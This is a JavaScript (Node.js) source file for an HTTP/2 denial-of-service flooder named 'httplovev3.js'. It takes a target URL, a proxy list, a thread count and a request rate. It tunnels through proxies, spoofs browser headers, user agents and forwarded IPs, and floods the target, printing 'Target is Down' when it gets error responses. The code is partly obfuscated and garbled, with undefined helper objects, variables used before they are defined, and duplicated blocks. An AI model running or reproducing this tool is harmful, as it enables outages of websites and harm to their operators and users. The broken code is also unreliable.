const socket = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const uagents = require("user-agents");
const fs = require("fs");
const fakeUa = require("fake-useragent");
const {HeaderGenerator: headergen} = require("header-generator");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (francia) {});
if (process.argv.length < 7) {
  console.log("Usage: node httplovev3.js <target> <time> <req_per_ip> <thread> <proxyfile>");
  console.log("Usage: node httplovev3.js https://love.com/ 120 64 30 https.txt")
  process.exit();
}
const presten = {};
function johnlloyd(torika) {
  return fs.readFileSync(torika, "utf-8").toString().split(/\r?\n/);
}
function elsah(peggye, caretha) {
  return Math.floor(seflfief.PNYGz(seflfief.hdqCQ(Math.random(), seflfief.PlDUF(caretha, peggye)), peggye));
}
function ursula(kenra) {
  return kenra[lovelovelove.ZCtNX(elsah, 0, kenra.length)];
}
function markiest(damitrius) {
  const imauri = function () {
    let damarii = true;
    return function (ilayah, genevi) {
      const dalesia = damarii ? function () {
        if (genevi) {
          const wane = genevi.apply(ilayah, arguments);
          return genevi = null, wane;
        }
      } : function () {};
      return damarii = false, dalesia;
    };
  }(), alidiya = imauri(this, function () {
    return alidiya.toString().search("(((.+)+)+)+$").toString().constructor(alidiya).search("(((.+)+)+)+$");
  });
  alidiya();
  var xenos = "";
  var macklen = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var christyonna = macklen.length;
  for (var brek = 0; brek < damitrius; brek++) {
    xenos += macklen.charAt(Math.floor(Math.random() * christyonna));
  }
  return xenos;
}
const enry = () => {
  const anura = () => {
    return Math.floor(versionlolsoggodbrowsereiei555.PRfbM(Math.random(), 255));
  };
  return versionlolsoggodbrowsereiei555.BQjJX(anura) + "." + versionlolsoggodbrowsereiei555.wSNLZ(anura) + "." + versionlolsoggodbrowsereiei555.ElzBZ(anura) + "." + versionlolsoggodbrowsereiei555.kYrRy(anura);
}, aionna = enry(), merdie = {target: process.argv[2], time: ~~process.argv[3], Rate: ~~process.argv[4], threads: ~~process.argv[5], proxyFile: process.argv[6]};
let jeniyah = new headergen({browsers: [{name: "chrome", minVersion: 80, maxVersion: 107, httpVersion: "2"}], devices: ["desktop"], operatingSystems: ["windows"], locales: ["en-US", "en"]}), trecie = jeniyah.getHeaders();
const tyonna = ["rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"], jenniferann = ["TLS_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_CHACHA20_POLY1305_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_128_CCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM", "TLS_AES_128_CCM_8_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM"], awbrey = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"], lexsie = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"], zihir = ["deflate, gzip, br", "gzip", "deflate", "br"], ahmik = ["no-cache", "max-age=0"], justus = ["http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", "http://engadget.search.aol.com/search?q=", "http://engadget.search.aol.com/search?q=query?=query=&q=", "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords="], djenaba = ["", "&", "", "&&", "and", "=", "+", "?"], zailah = ["1", "2", "3", "4", "5", "6"], jacaria = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0", "Mozilla/5.0 (Windows NT 10.0; rv:112.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.34", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.0.2246 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Goanna/6.0 Firefox/102.0 PaleMoon/32.0.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"];
var tawne = jenniferann[Math.floor(Math.floor(Math.random() * jenniferann.length))], deri = tyonna[Math.floor(Math.floor(Math.random() * tyonna.length))], graecyn = jacaria[Math.floor(Math.floor(Math.random() * jacaria.length))], yakia = djenaba[Math.floor(Math.random() * djenaba.length)], tamaro = zailah[Math.floor(Math.random() * zailah.length)], zohan = justus[Math.floor(Math.floor(Math.random() * justus.length))], jadarrius = awbrey[Math.floor(Math.floor(Math.random() * awbrey.length))], camille = lexsie[Math.floor(Math.floor(Math.random() * lexsie.length))], laurrine = zihir[Math.floor(Math.floor(Math.random() * zihir.length))], machiavelli = ahmik[Math.floor(Math.floor(Math.random() * ahmik.length))], thoedore = johnlloyd(merdie.proxyFile);
const jamai = url.parse(merdie.target);
if (cluster.isMaster) {
  for (let beatriz = 1; beatriz <= merdie.threads; beatriz++) {
    cluster.fork();
  }
} else {
  setInterval(lamare);
}
class xxxxxxxxxxxx {
  constructor() {}
  ["HTTP"](xxxxxxx, returndaerrorlolhahaha) {
    const vrunda = xxxxxxx.address.split(":"), maclane = vrunda[0], sotero = floodereiei.akgpR(floodereiei.akgpR("CONNECT " + xxxxxxx.address, ":443 HTTP/1.1\r\nHost: "), xxxxxxx.address) + ":443\r\nConnection: Keep-Alive\r\n\r\n", paislie = new Buffer.from(sotero), shambria = socket.connect({host: xxxxxxx.host, port: xxxxxxx.port});
    shambria.setTimeout(xxxxxxx.timeout * 1e5);
    shambria.setKeepAlive(true, 1e5);
    shambria.on("connect", () => {
      shambria.write(paislie);
    });
    shambria.on("data", yasemin => {
      const laraye = yasemin.toString("utf-8"), ikraan = laraye.includes("HTTP/1.1 429"), dellaney = laraye.includes("HTTP/1.1 503"), sonda = laraye.includes("HTTP/1.1 305"), kialee = laraye.includes("HTTP/1.1 307"), damesha = laraye.includes("HTTP/1.1 302"), sameika = laraye.includes("HTTP/1.1 522");
      if (ikraan === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      if (dellaney === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      if (sonda === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      if (kialee === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      if (damesha === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      if (sameika === true) {
        return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: invalid response from proxy server");
      }
      return returndaerrorlolhahaha(shambria, undefined);
    });
    shambria.on("timeout", () => {
      return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: timeout exceeded");
    });
    shambria.on("error", jasenia => {
      return shambria.destroy(), returndaerrorlolhahaha(undefined, "error: " + jasenia);
    });
  }
}
const burleigh = new xxxxxxxxxxxx;
presten[":authority"] = jamai.host;
presten[":method"] = "GET";
presten[":path"] = jamai.path + "?" + markiest(6) + "=" + markiest(12);
presten.origin = jamai.protocol + "//" + jamai.host;
presten[":scheme"] = "https";
presten.accept = jadarrius;
presten["accept-encoding"] = laurrine;
presten["accept-language"] = camille;
presten["cache-control"] = "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0";
presten["upgrade-insecure-requests"] = "1";
presten.pragma = "no-cache";
presten.TE = "trailers";
presten.Trailer = "Max-Forwards";
presten["content-type"] = "text/plain";
presten["user-agent"] = graecyn;
function lamare() {
  const alxander = ursula(thoedore), luisandres = alxander.split(":"), bobo = new uagents;
  var donnel = bobo.toString();
  presten["X-Forwarded-For"] = aionna;
  presten["X-Forwarded-Host"] = aionna;
  presten["Real-IP"] = aionna;
  const willson = {host: luisandres[0], port: ~~luisandres[1], address: jamai.host + ":443", timeout: 100};
  burleigh.HTTP(willson, (avidan, anavaeh) => {
    if (anavaeh) {
      return;
    }
    avidan.setKeepAlive(true, 6e5);
    const zakani = {host: jamai.host, ecdhCurve: "prime256v1:X25519", ciphers: tls.getCiphers().join(":") + tawne, secureProtocol: ["TLSv1_2_method", "TLSv1_3_methd", "SSL_OP_NO_SSLv3", "SSL_OP_NO_SSLv2", "TLS_OP_NO_TLS_1_1", "TLS_OP_NO_TLS_1_0"], sigals: deri, servername: jamai.host, challengesToSolve: Infinity, resolveWithFullResponse: true, cloudflareTimeout: 5e3, cloudflareMaxTimeout: 3e4, maxRedirects: Infinity, followAllRedirects: true, decodeEmails: false, gzip: true, servername: jamai.host, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: avidan}, striker = tls.connect(443, jamai.host, zakani);
    striker.setKeepAlive(true, 1e5);
    amyrie.settings(elsasolove);
    amyrie.setMaxListeners(0);
    amyrie.on("connect", () => {
      const zenayah = setInterval(() => {
        for (let simao = 0; simao < merdie.Rate; simao++) {
          const jaydelyn = amyrie.request(presten).on("response", kataleah => {
            jaydelyn.close();
            jaydelyn.destroy();
            return;
          });
          jaydelyn.end();
        }
      }, 1e3);
    });
    amyrie.on("close", () => {
      amyrie.destroy();
      avidan.destroy();
      return;
    });
    amyrie.on("error", kalypso => {
      amyrie.destroy();
      avidan.destroy();
      return;
    });
    const amyrie = http2.connect(jamai.href, {protocol: "https:", settings: flooderlove, maxSessionMemory: 64e3, maxDeflateDynamicTableSize: 4294967295, createConnection: () => striker, socket: avidan});
    amyrie.settings(elsasolove);
    amyrie.setMaxListeners(0);
    amyrie.on("connect", () => {
      const kelechukwu = setInterval(() => {
        for (let delcina = 0; delcina < merdie.Rate; delcina++) {
          const sybastian = amyrie.request(presten).on("response", susana => {
            sybastian.close();
            sybastian.destroy();
            return;
          });
          sybastian.end();
        }
      }, 1e3);
    });
    amyrie.on("close", () => {
      amyrie.destroy();
      avidan.destroy();
      return;
    });
    amyrie.on("error", aleli => {
      amyrie.destroy();
      avidan.destroy();
      return;
    });
  });
  (function (emarosa, okeith, marishka) {
    if (okeith.statusCode == 200) {
      console.log("Status 200");
    } else {
      ;
      (okeith.statusCode == 502 || okeith.statusCode == 503 || okeith.statusCode == 504 || okeith.statusCode == 520 || okeith.statusCode == 525 || okeith.statusCode == 522) && console.log("Target is Down");
    }
  });
}
const haamid = () => process.exit(1);
setTimeout(haamid, merdie.time * 1e3);
